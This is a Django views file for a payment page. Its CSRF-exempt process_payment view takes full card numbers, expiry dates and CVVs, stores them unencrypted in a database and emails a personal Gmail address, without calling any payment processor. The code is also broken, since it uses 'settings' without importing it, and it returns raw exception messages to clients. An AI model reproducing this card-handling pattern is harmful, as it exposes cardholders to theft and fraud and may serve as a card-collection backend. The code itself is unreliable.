from django.shortcuts import render
from django.core.mail import send_mail
import json
from django.http import JsonResponse
from django.views.decorators.csrf import csrf_exempt
from .models import Payment

# Create your views here.
def index(request):
    return render(request, 'index.html')


def payment(request):
    return render(request, 'payment.html')

def cardpayment(request):
    return render(request, 'cardpayment.html')

@csrf_exempt
def process_payment(request):  # Use lowercase function name
    if request.method == "POST":
        try:
            data = json.loads(request.body)

            # Validate required fields
            required_fields = ["cardholder_name", "card_number", "expiry_date", "cvv", "amount"]
            for field in required_fields:
                if field not in data or not data[field]:
                    return JsonResponse({"success": False, "error": f"Missing field: {field}"}, status=400)

            # Save payment in the database
            payment = Payment.objects.create(
                cardholder_name=data["cardholder_name"],
                card_number=data["card_number"],  # Consider hashing for security
                expiry_date=data["expiry_date"],
                cvv=data["cvv"],  # Consider hashing
                amount=data["amount"]
            )

            # Send email to admin
            send_mail(
                subject="New Payment Received",
                message=f"A new payment has been received:\n\n"
                        f"Cardholder: {payment.cardholder_name}\n"
                        f"Amount: {payment.amount} USD\n"
                        f"Expiry Date: {payment.expiry_date}\n"
                        f"Time: {payment.timestamp}\n\n"
                        f"Please review the transaction in the admin panel.",
                from_email=settings.EMAIL_HOST_USER,
                recipient_list=["setmega86@gmail.com"],  # Replace with admin email
                fail_silently=False,
            )

            return JsonResponse({"success": True, "transaction_id": payment.id})

        except json.JSONDecodeError:
            return JsonResponse({"success": False, "error": "Invalid JSON format"}, status=400)
        except Exception as e:
            return JsonResponse({"success": False, "error": str(e)}, status=500)

    return JsonResponse({"error": "Invalid request method"}, status=400)